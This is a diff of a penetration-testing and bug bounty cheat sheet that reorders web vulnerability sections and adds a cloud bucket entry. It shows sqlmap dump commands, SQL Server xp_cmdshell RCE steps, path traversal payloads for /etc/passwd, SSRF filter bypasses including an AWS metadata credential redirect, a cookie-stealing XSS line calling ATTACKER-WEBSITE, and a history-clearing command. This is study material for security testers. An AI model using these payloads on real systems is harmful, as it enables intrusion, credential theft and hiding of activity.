@@ -26,17 +26,18 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 - [Network](#network)
 - [Linux](#linux)
 - [Web vulnerabilities](#web-vulnerabilities)
-  - [XSS](#xss)
   - [SQLi](#sqli)
-  - [SSRF](#ssrf)
   - [Authentication vulnerabilities](#authentication-vulnerabilities)
-  - [Access control vulnerabilities and privilege escalation](#access-control-vulnerabilities-and-privilege-escalation)
   - [Directory Traversal](#directory-traversal)
   - [Business logic vulnerabilities](#business-logic-vulnerabilities)
+  - [Access control vulnerabilities and privilege escalation](#access-control-vulnerabilities-and-privilege-escalation)
+  - [SSRF](#ssrf)
+  - [XSS](#xss)
   - [CORS](#cors)
   - [Deserialization](#deserialization)
   - [HTTP Host header attacks](#http-host-header-attacks)
   - [Abusing S3 Bucket Permissions](#abusing-s3-bucket-permissions)
+  - [Google Cloud Storage bucket misconfiguration]()
   - [GraphQL](#graphql)
   - [WordPress](#wordpress)
   - [IIS - Internet Information Services](#iis---internet-information-services)
@@ -475,6 +476,136 @@ ssh user@X.X.X.X | cat /dev/null > ~/.bash_history    Clear bash history
 
 ## Web vulnerabilities
 
+
+
+### <ins>SQLi</ins>
+
+**Tools**
+- [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+- [sqlmap](https://sqlmap.org/)
+
+```
+ > SQLMap: sqlmap -u https://vulnerable/index.php?id=1
+                  --tables (to see db)
+                  -D DATABASE_NAME -T TABLE_NAME --dump (to see data)
+                  --forms --batch --crawl=10 --random-agent --level=5 --risk=3 (to crawl)
+```
+
+**RCE**
+```sql
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+xp_cmdshell 'COMMAND';
+```
+
+```
+EXEC sp_configure 'allow updates', 0
+RECONFIGURE
+EXEC sp_configure 'show advanced options', 1
+GO
+RECONFIGURE
+GO
+EXEC sp_configure 'xp_cmdshell', 1
+GO
+RECONFIGURE
+GO
+xp_cmdshell 'COMMAND';
+```
+
+
+
+### <ins>Authentication vulnerabilities</ins>
+
+- Multi-factor authentication
+  - Try to intercept the response and modify the status to `200`;
+  - Bruteforce.
+- Password reset
+  - Change the `Host` with the host of your server. The request for a password reset might use the `Host` value for the link with the reset token;
+  - Try with headers like `X-Forwarded-Host:`.
+- [Password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)
+- [Keeping users logged in](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
+
+
+
+### <ins>Directory Traversal</ins>
+
+- simple case `https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`
+- absolute path `https://insecure-website.com/loadImage?filename=/etc/passwd`
+- stripped non-recursively `https://insecure-website.com/loadImage?filename=....//....//....//etc/passwd`
+- superfluous URL-decode `https://insecure-website.com/loadImage?filename=..%252f..%252f..%252fetc/passwd`
+- validation of start of path `https://insecure-website.com/loadImage?filename=/var/www/images/../../../etc/passwd`
+- validation of start of path `https://insecure-website.com/loadImage?filename=../../../etc/passwd%00.png`
+
+
+
+### <ins>Business logic vulnerabilities</ins>
+
+Examples:
+- Excessive trust in client-side controls
+- 2FA broken logic
+- Failing to handle unconventional input
+- Inconsistent security controls
+- Weak isolation on dual-use endpoint
+- Password reset broken logic
+- Insufficient workflow validation
+- Flawed enforcement of business rules
+- [Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)
+
+
+
+### <ins>Access control vulnerabilities and privilege escalation</ins>
+
+In the context of web applications, access control is dependent on authentication and session management:
+- Authentication identifies the user and confirms that they are who they say they are;
+- Session management identifies which subsequent HTTP requests are being made by that same user;
+- Access control determines whether the user is allowed to carry out the action that they are attempting to perform.
+
+From a user perspective, access controls can be divided into the following categories:
+- Vertical access controls
+  Mechanisms that restrict access to sensitive functionality that is not available to other types of users
+- Horizontal access controls
+  Mechanisms that restrict access to resources to the users who are specifically allowed to access those resources
+- Context-dependent access controls
+  Restrict access to functionality and resources based upon the state of the application or the user's interaction with it
+
+**Tools**
+- [Autorize](https://github.com/PortSwigger/autorize)
+- [Authz](https://portswigger.net/bappstore/4316cc18ac5f434884b2089831c7d19e)
+- [UUID Detector](https://portswigger.net/bappstore/65f32f209a72480ea5f1a0dac4f38248)
+- Check also endpoints in JS files
+
+
+
+### <ins>SSRF</ins>
+
+SSRF with blacklist-based input filters bypass: Some applications block input containing hostnames like `127.0.0.1` and localhost, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using various techniques:
+- Using an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`;
+- Registering your own domain name that resolves to `127.0.0.1`. You can use spoofed.burpcollaborator.net for this purpose or the domain `firefox.fr` is a DNS that point to `127.0.0.1`.;
+- Obfuscating blocked strings using URL encoding or case variation.
+
+SSRF with whitelist-based input filters bypass
+- You can embed credentials in a URL before the hostname, using the `@` character. For example: `https://expected-host@evil-host`.
+- You can use the `#` character to indicate a URL fragment. For example: `https://evil-host#expected-host`.
+- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: `https://expected-host.evil-host`.
+- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
+- You can use combinations of these techniques together.
+
+Other tips
+- By combining it with an open redirect, you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
+- Open Redirect Bypass:
+  - https://subdomain.victim.com/r/redir?url=https%3A%2F%2Fvictim.com%40ATTACKER_WEBSITE.COM?x=subdomain.victim.com%2f
+- For AWS, bypass some restrictions by hosting this PHP page ([Reference](https://hackerone.com/reports/508459)):
+  ```PHP
+  <?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
+  ```
+- If everything fails, look for assets pointing to internal IPs. You can usually find these via CSP headers, JS files, Github, shodan/censys etc. [[Reference](https://twitter.com/bogdantcaciuc7/status/1561572514295341058)]
+- [SSRF (Server Side Request Forgery) testing resources](https://github.com/cujanovic/SSRF-Testing)
+
+Burp extensions
+- [Collaborator Everywhere](https://portswigger.net/bappstore/2495f6fb364d48c3b6c984e226c02968)
+
+
+
 ### <ins>XSS</ins>
 
 - [Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
@@ -544,133 +675,6 @@ ssh user@X.X.X.X | cat /dev/null > ~/.bash_history    Clear bash history
   - ```HTML
     <img src=x onerror=this.src='http://ATTACKER-WEBSITE/?'+document.cookie;>
     ```
-
-
-
-### <ins>SQLi</ins>
-
-**Tools**
-- [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
-- [sqlmap](https://sqlmap.org/)
-
-```
- > SQLMap: sqlmap -u https://vulnerable/index.php?id=1
-                  --tables (to see db)
-                  -D DATABASE_NAME -T TABLE_NAME --dump (to see data)
-                  --forms --batch --crawl=10 --random-agent --level=5 --risk=3 (to crawl)
-```
-
-**RCE**
-```sql
-EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-xp_cmdshell 'COMMAND';
-```
-
-```
-EXEC sp_configure 'allow updates', 0
-RECONFIGURE
-EXEC sp_configure 'show advanced options', 1
-GO
-RECONFIGURE
-GO
-EXEC sp_configure 'xp_cmdshell', 1
-GO
-RECONFIGURE
-GO
-xp_cmdshell 'COMMAND';
-```
-
-
-
-### <ins>SSRF</ins>
-
-SSRF with blacklist-based input filters bypass: Some applications block input containing hostnames like `127.0.0.1` and localhost, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using various techniques:
-- Using an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`;
-- Registering your own domain name that resolves to `127.0.0.1`. You can use spoofed.burpcollaborator.net for this purpose or the domain `firefox.fr` is a DNS that point to `127.0.0.1`.;
-- Obfuscating blocked strings using URL encoding or case variation.
-
-SSRF with whitelist-based input filters bypass
-- You can embed credentials in a URL before the hostname, using the `@` character. For example: `https://expected-host@evil-host`.
-- You can use the `#` character to indicate a URL fragment. For example: `https://evil-host#expected-host`.
-- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: `https://expected-host.evil-host`.
-- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
-- You can use combinations of these techniques together.
-
-Other tips
-- By combining it with an open redirect, you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
-- Open Redirect Bypass:
-  - https://subdomain.victim.com/r/redir?url=https%3A%2F%2Fvictim.com%40ATTACKER_WEBSITE.COM?x=subdomain.victim.com%2f
-- For AWS, bypass some restrictions by hosting this PHP page ([Reference](https://hackerone.com/reports/508459)):
-  ```PHP
-  <?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
-  ```
-- If everything fails, look for assets pointing to internal IPs. You can usually find these via CSP headers, JS files, Github, shodan/censys etc. [[Reference](https://twitter.com/bogdantcaciuc7/status/1561572514295341058)]
-- [SSRF (Server Side Request Forgery) testing resources](https://github.com/cujanovic/SSRF-Testing)
-
-Burp extensions
-- [Collaborator Everywhere](https://portswigger.net/bappstore/2495f6fb364d48c3b6c984e226c02968)
-
-
-### <ins>Authentication vulnerabilities</ins>
-
-- Multi-factor authentication
-  - Try to intercept the response and modify the status to `200`;
-  - Bruteforce.
-- Password reset
-  - Change the `Host` with the host of your server. The request for a password reset might use the `Host` value for the link with the reset token;
-  - Try with headers like `X-Forwarded-Host:`.
-- [Password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)
-- [Keeping users logged in](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
-
-
-
-### <ins>Access control vulnerabilities and privilege escalation</ins>
-
-In the context of web applications, access control is dependent on authentication and session management:
-- Authentication identifies the user and confirms that they are who they say they are;
-- Session management identifies which subsequent HTTP requests are being made by that same user;
-- Access control determines whether the user is allowed to carry out the action that they are attempting to perform.
-
-From a user perspective, access controls can be divided into the following categories:
-- Vertical access controls
-  Mechanisms that restrict access to sensitive functionality that is not available to other types of users
-- Horizontal access controls
-  Mechanisms that restrict access to resources to the users who are specifically allowed to access those resources
-- Context-dependent access controls
-  Restrict access to functionality and resources based upon the state of the application or the user's interaction with it
-
-**Tools**
-- [Autorize](https://github.com/PortSwigger/autorize)
-- [Authz](https://portswigger.net/bappstore/4316cc18ac5f434884b2089831c7d19e)
-- [UUID Detector](https://portswigger.net/bappstore/65f32f209a72480ea5f1a0dac4f38248)
-- Check also endpoints in JS files
-
-
-
-### <ins>Directory Traversal</ins>
-
-- simple case `https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`
-- absolute path `https://insecure-website.com/loadImage?filename=/etc/passwd`
-- stripped non-recursively `https://insecure-website.com/loadImage?filename=....//....//....//etc/passwd`
-- superfluous URL-decode `https://insecure-website.com/loadImage?filename=..%252f..%252f..%252fetc/passwd`
-- validation of start of path `https://insecure-website.com/loadImage?filename=/var/www/images/../../../etc/passwd`
-- validation of start of path `https://insecure-website.com/loadImage?filename=../../../etc/passwd%00.png`
-
-
-
-### <ins>Business logic vulnerabilities</ins>
-
-Examples:
-- Excessive trust in client-side controls
-- 2FA broken logic
-- Failing to handle unconventional input
-- Inconsistent security controls
-- Weak isolation on dual-use endpoint
-- Password reset broken logic
-- Insufficient workflow validation
-- Flawed enforcement of business rules
-- [Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)
 
 
 
@@ -779,6 +783,13 @@ Target example: `http://[name_of_bucket].s3.amazonaws.com`
 **Resources**
 - https://blog.yeswehack.com/yeswerhackers/abusing-s3-bucket-permissions/
 - https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_examples_s3_rw-bucket.html
+
+
+
+### <ins>Google Cloud Storage bucket</ins>
+
+**Tool**
+https://github.com/RhinoSecurityLabs/GCPBucketBrute
 
 
 
